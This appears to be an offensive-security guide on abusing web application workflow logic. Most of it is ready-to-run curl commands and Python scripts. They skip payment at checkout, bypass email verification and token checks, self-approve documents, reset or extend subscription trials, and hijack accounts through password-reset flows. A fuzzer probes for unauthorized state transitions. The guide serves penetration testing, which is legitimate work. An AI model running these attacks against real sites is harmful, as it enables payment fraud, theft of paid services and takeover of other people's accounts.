# State Machine Abuse Guide

> Techniques for exploiting flawed state machine implementations in web applications. Covers workflow bypass, step skipping, state transition manipulation, and order-of-operations attacks targeting multi-step processes like checkout flows, account verification, and approval workflows.

---

## 1. Identifying State Machine Vulnerabilities

State machine flaws occur when applications enforce multi-step workflows on the client side but fail to validate state transitions server-side. Common vulnerable patterns include:

- Multi-step forms where step N+1 does not verify step N completed
- Order/checkout flows where payment can be skipped
- Account verification that can be bypassed by direct endpoint access
- Approval workflows where intermediate states can be manipulated

```bash
# Map the state machine by observing normal flow
# Record all requests in a multi-step process

# Step 1: Capture the normal workflow with Burp or mitmproxy
mitmproxy --mode regular --save-stream-file checkout_flow.mitm

# Step 2: Extract unique endpoints from the captured flow
grep -oP 'https?://[^\s"]+' checkout_flow.mitm | sort -u > endpoints.txt

# Step 3: Identify state parameters in requests
# Look for: step=, state=, phase=, stage=, flow_id=, token=
grep -iE '(step|state|phase|stage|flow|status)=' endpoints.txt
```

---

## 2. Checkout Flow Step Skipping

The most common state machine abuse: skipping payment in e-commerce checkout flows.

```bash
# Normal flow:
# 1. POST /cart/add        → adds item
# 2. POST /checkout/start  → initiates checkout, returns checkout_id
# 3. POST /checkout/payment → processes payment
# 4. POST /checkout/confirm → confirms order

# Attack: Skip step 3 (payment) and go directly to confirmation
# First, complete steps 1 and 2 normally
CHECKOUT_ID=$(curl -s -X POST https://target.com/checkout/start \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"cart_id": "CART_123"}' | jq -r '.checkout_id')

# Skip payment — go directly to confirm
curl -s -X POST https://target.com/checkout/confirm \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/json" \
  -d "{\"checkout_id\": \"$CHECKOUT_ID\"}"

# Variant: Manipulate the state parameter directly
curl -s -X POST https://target.com/checkout/update-state \
  -H "Cookie: session=VALID_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"checkout_id": "'"$CHECKOUT_ID"'", "state": "payment_complete"}'
```

---

## 3. Account Verification Bypass

Exploiting verification workflows that do not enforce sequential state transitions.

```python
import requests

base_url = "https://target.com"
session = requests.Session()

# Normal flow:
# 1. POST /register          → creates unverified account
# 2. GET  /verify?token=XXX  → email verification
# 3. POST /profile/setup     → only accessible after verification
# 4. GET  /dashboard         → full access

# Attack 1: Access post-verification endpoints directly
# Register account
session.post(f"{base_url}/register", json={
    "email": "attacker@evil.com",
    "password": "Password123!"
})

# Skip email verification — access profile setup directly
resp = session.post(f"{base_url}/profile/setup", json={
    "display_name": "Attacker",
    "role": "admin"  # Bonus: try role manipulation
})
print(f"Profile setup without verification: {resp.status_code}")

# Attack 2: Manipulate verification status via API
# Some apps expose internal state update endpoints
resp = session.patch(f"{base_url}/api/user/status", json={
    "email_verified": True,
    "account_status": "active"
})
print(f"Direct status manipulation: {resp.status_code}")

# Attack 3: Re-use verification token from another account
# If tokens are predictable or sequential
for token_guess in range(1000, 2000):
    resp = session.get(f"{base_url}/verify?token={token_guess}")
    if resp.status_code == 200 and "verified" in resp.text.lower():
        print(f"[+] Valid token found: {token_guess}")
        break
```

---

## 4. Approval Workflow Manipulation

Targeting multi-party approval systems where state transitions lack authorization checks.

```bash
# Scenario: Document approval workflow
# States: draft → submitted → reviewed → approved → published
# Normal: Author submits, Reviewer reviews, Manager approves

# Attack 1: Self-approve by calling the approval endpoint as the author
curl -s -X POST https://target.com/api/documents/DOC_123/approve \
  -H "Cookie: session=AUTHOR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"decision": "approved", "comment": "Looks good"}'

# Attack 2: Skip review state — go from submitted to published
curl -s -X PATCH https://target.com/api/documents/DOC_123 \
  -H "Cookie: session=AUTHOR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"status": "published"}'

# Attack 3: Transition backward to re-edit an approved document
curl -s -X PATCH https://target.com/api/documents/DOC_123 \
  -H "Cookie: session=AUTHOR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"status": "draft"}'

# Then modify content and re-submit (bypasses review of changes)
curl -s -X PATCH https://target.com/api/documents/DOC_123 \
  -H "Cookie: session=AUTHOR_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"content": "MODIFIED MALICIOUS CONTENT", "status": "approved"}'
```

---

## 5. Subscription and Trial Abuse

Exploiting state transitions in subscription management systems.

```python
import requests
import time

session = requests.Session()
session.headers.update({
    "Cookie": "session=USER_SESSION",
    "Content-Type": "application/json"
})

base = "https://target.com/api"

# Attack 1: Extend trial by resetting state
# Cancel subscription then re-activate trial
session.post(f"{base}/subscription/cancel")
time.sleep(1)
resp = session.post(f"{base}/subscription/start-trial")
print(f"Trial restart: {resp.json()}")

# Attack 2: Downgrade then upgrade without payment
# Move to free tier, then directly set premium state
session.post(f"{base}/subscription/change", json={"plan": "free"})
session.patch(f"{base}/subscription", json={
    "plan": "enterprise",
    "status": "active",
    "payment_status": "paid"
})

# Attack 3: Manipulate trial end date
session.patch(f"{base}/subscription", json={
    "trial_ends_at": "2030-12-31T23:59:59Z"
})

# Attack 4: Access premium features via direct endpoint
# Even on free tier, premium API endpoints may not check subscription state
resp = session.get(f"{base}/premium/export-data?format=pdf")
print(f"Premium feature access on free tier: {resp.status_code}")
```

---

## 6. Password Reset State Manipulation

Exploiting password reset flows that fail to invalidate intermediate states.

```bash
# Normal flow:
# 1. POST /forgot-password     → sends reset email with token
# 2. GET  /reset?token=ABC     → validates token, shows reset form
# 3. POST /reset-password      → changes password with token

# Attack 1: Use reset token for a different account
# Request reset for victim, intercept token, apply to attacker account
curl -s -X POST https://target.com/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token": "VICTIM_RESET_TOKEN", "email": "attacker@evil.com", "new_password": "hacked123"}'

# Attack 2: Reuse expired/used token (if not invalidated after use)
curl -s -X POST https://target.com/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token": "PREVIOUSLY_USED_TOKEN", "new_password": "hacked_again"}'

# Attack 3: Skip token validation by accessing reset endpoint directly
curl -s -X POST https://target.com/reset-password \
  -H "Content-Type: application/json" \
  -d '{"user_id": "VICTIM_ID", "new_password": "no_token_needed"}'

# Attack 4: Manipulate the state to "token_validated" without a valid token
curl -s -X POST https://target.com/api/auth/state \
  -H "Cookie: session=ATTACKER_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"reset_state": "token_validated", "target_user": "victim@target.com"}'
```

---

## 7. Automated State Machine Fuzzing

Systematically discover state machine flaws by testing all possible transitions.

```python
import requests
from itertools import permutations

class StateMachineFuzzer:
    def __init__(self, base_url, session_cookie):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            "Cookie": f"session={session_cookie}",
            "Content-Type": "application/json"
        })
    
    def fuzz_transitions(self, states, transition_endpoint):
        """Test all possible state transitions to find unauthorized ones."""
        results = []
        
        for current_state, target_state in permutations(states, 2):
            # Set current state
            self.session.patch(
                f"{self.base_url}{transition_endpoint}",
                json={"status": current_state}
            )
            
            # Attempt transition to target state
            resp = self.session.patch(
                f"{self.base_url}{transition_endpoint}",
                json={"status": target_state}
            )
            
            if resp.status_code == 200:
                results.append({
                    "from": current_state,
                    "to": target_state,
                    "allowed": True,
                    "response": resp.text[:200]
                })
                print(f"[+] ALLOWED: {current_state} -> {target_state}")
            else:
                print(f"[-] BLOCKED: {current_state} -> {target_state}")
        
        return results

# Usage
fuzzer = StateMachineFuzzer("https://target.com", "SESSION_TOKEN")
states = ["draft", "submitted", "reviewed", "approved", "rejected", "published"]
findings = fuzzer.fuzz_transitions(states, "/api/documents/DOC_123")

# Report unauthorized transitions
unauthorized = [f for f in findings if f["allowed"]]
print(f"\n[*] Found {len(unauthorized)} unauthorized state transitions")
```

---

## Key Takeaways

- State machine vulnerabilities are logic flaws — scanners cannot detect them automatically
- Always test: skipping steps, reversing transitions, accessing endpoints out of order
- Payment bypass is the highest-impact finding in e-commerce state machine abuse
- Check both the state parameter manipulation AND direct endpoint access approaches
- Multi-party approval workflows often lack per-role transition enforcement
- Document the intended state machine (from documentation or observation) before testing deviations
- Automated fuzzing of all state permutations reveals transitions developers forgot to block
